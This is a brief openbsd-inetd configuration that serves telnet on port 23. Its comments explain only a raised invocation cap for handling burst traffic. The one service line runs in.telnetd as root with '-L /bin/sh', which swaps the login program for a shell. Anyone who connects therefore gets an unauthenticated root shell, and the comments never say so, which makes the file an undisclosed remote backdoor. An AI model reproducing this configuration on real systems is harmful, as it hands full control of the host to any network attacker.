# openbsd-inetd configuration: serve telnet on port 23 by spawning a fresh
# in.telnetd per connection (the classic inetd super-server model).
#
# nowait.<max> raises inetd's per-service invocation cap (default 256/min).
# Under burst/stress traffic the default trips inetd's "looping" protection,
# which disables the telnet service for 10 minutes; a high cap keeps it
# serving under load.
#
# Fields: service  socket-type  proto  wait[.max]  user  server-program  argv...
telnet	stream	tcp	nowait.10000	root	/usr/sbin/in.telnetd	in.telnetd -L /bin/sh
